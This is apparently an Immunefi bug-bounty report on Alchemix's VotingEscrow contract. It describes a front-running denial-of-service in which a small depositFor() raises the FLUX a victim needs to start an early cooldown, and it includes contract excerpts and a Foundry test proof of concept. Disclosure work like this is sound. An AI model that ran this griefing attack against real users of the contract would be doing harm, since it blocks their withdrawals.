# DoS in startCooldown() when users want start coold down before lock is expired

Submitted on May 12th 2024 at 11:24:32 UTC by @Lastc0de for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31080

Report type: Smart Contract

Report severity: Insight

Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol

Impacts:
- Permanent freezing of unclaimed yield
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
- Temporary freezing of funds for 12 hours

## Description
## Brief/Intro
There will be a one-epoch `cooldown` period between unlocked tokens and being able to claim them to the userâ€™s wallet. Locked tokens can become eligible for unlocks by burning Flux tokens.
When the user wants to withdraw his/here locked tokens, he/she must start the `cooldDown` mechanism before withdrawing, otherwise he will not be able to withdraw.

Activating this process is possible in two ways:
* 1- lock period is expired
* 2- lock period is not expired

There is a vulnerability in model 2 that allows a malicious user to freeze the activation of this process for a short or long time for users who want to use the second method ( Denial-of-Service).

## Vulnerability Details
* Vulnerable contract is `VotingEscrow.sol`:

https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol

* Vulnerable function is `startCooldown()` :
https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L778C1-L804C6

~~~
    function startCooldown(uint256 _tokenId) external {
//...

        locked[_tokenId].cooldown = block.timestamp + WEEK;

        // If lock is not expired, cooldown can only be started by burning FLUX
        if (block.timestamp < _locked.end) {
            // Amount of FLUX required to ragequit
            uint256 fluxToRagequit = amountToRagequit(_tokenId); // @AUDIT-1

            require(IFluxToken(FLUX).balanceOf(msg.sender) >= fluxToRagequit, "insufficient FLUX balance"); // @AUDIT-2

            IFluxToken(FLUX).burnFrom(msg.sender, fluxToRagequit);

            emit Ragequit(msg.sender, _tokenId, block.timestamp);
        }

        emit CooldownStarted(msg.sender, _tokenId, _locked.cooldown);
    }
~~~

When a user want withdraw his/here locked amounts before do that should start coold down process.
Above we can see the function that activates this process.
When a user  who wish to unlock their veALCX early, should burn Flux Tokens this means that should buy Flux Token of other users

## Deep dive

* AUDIT-1
For this, the `VotingEscrow.sol` first calculates Amount of FLUX required to `ragequit` by calling the `amountToRagequit()` function:
https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L345C1-L356C6
~~~
    /// @inheritdoc IVotingEscrow
    function amountToRagequit(uint256 _tokenId) public view returns (uint256) {
        // amount of flux earned in one epoch
        uint256 oneEpochFlux = claimableFlux(_tokenId); // @AUDIT-1-A

//..
    }

~~~
* AUDIT-1-A
In the first line of this function, the amount of flux earned in one epoch is obtained by calling the `claimableFlux` function:
https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L377C1-L385C6
~~~
    function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }

        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS; // @AUDIT-1-A-a
    }
~~~
* AUDIT-1-A-a
This line calculate and return Amount of flux claimable is <fluxPerVeALCX> percent of the balance
* as you can see this function calculate returned value by percent of the balance so by deposit  for a `tokenId` can manipulate this value.


We can do this by calling the `depositFor()` function:
https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L667C1-L678C1

~~~
    function depositFor(uint256 _tokenId, uint256 _value) external nonreentrant {
//...
    }

~~~


## but what is the problem?

So we go to the beginning of the report to see `AUDIT-2`:

* AUDIT-2 : `require(IFluxToken(FLUX).balanceOf(msg.sender) >= fluxToRagequit, "insufficient FLUX balance");`

If the balance of the  Flux Token for user is less than the calculated value meaning `fluxToRagequit`, the user cannot call this function for a while, so the user must increase the balance of Flux tokens in his wallet, and this is only possible by buying tokens from other users.

## Secnario

For example, Bob wants to withdraw his tokens before the lock time done.

1- Bob knows for do this should buy 5 Flux Token

2- Bob buyed 5 Flux Token

3- Alex knows Bob Want withdraw his locked tokens (Ex:front-running)

4- Alex before Bob make call depositFor() - for Bob tokenId with small amount

5- Bob cant start coold down because he does not have enough tokens for this

6- Bob should buy more Flux Token

7- A malicious user can do this for a long time and prevent the withdrawal of other users' tokens

## Impact Details
Attacker can Freeze this function for users so users for short -or long time cant withdraw his/here locked tokens

## Proof of Concept
1- Add this function in `VotingEscrow.t.sol` file :

~~~
    function test_AmountToRagequit_Fuzzing() public {
        uint256 tokenId = createVeAlcx(admin, TOKEN_1, THREE_WEEKS, false);

        uint256 ragequitAmount = veALCX.amountToRagequit(tokenId);

        // Log regequitAmount
        console.log("#BEFORE - How much `ragequitAmount` need ? %d", ragequitAmount);

        // Mint needed Ragequit and withdraw token
        hevm.prank(address(veALCX));
        flux.mint(admin, ragequitAmount);

        // Approve Flux token
        hevm.prank(admin);
        flux.approve(address(veALCX), ragequitAmount);


        /* Maliciouse User call `depositFor()` function for tokenId with small amount
            1- Mint bpt token for this Maliciouse contract
            2- call depositFor() , for tokenId
        */
        deal(bpt, address(this), TOKEN_1);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);
        veALCX.depositFor(tokenId, 1e7); // Deposit small amount for user - `tokenId`

        // Log regequitAmount
        uint256 ragequitAmount_AFTER = veALCX.amountToRagequit(tokenId);
        console.log("#AFTER - How much `ragequitAmount` need ? %d", ragequitAmount_AFTER);

        // check `ragequitAmount` and `ragequitAmount_AFTER` is equal or not
        assertEq(ragequitAmount,ragequitAmount_AFTER,"`ragequitAmount` before and after not equal because:");

        hevm.expectRevert("startCooldown() TX reverted because : `ragequitAmount` increased by Maliciouse user");
        hevm.prank(admin);
        veALCX.startCooldown(tokenId);
    }
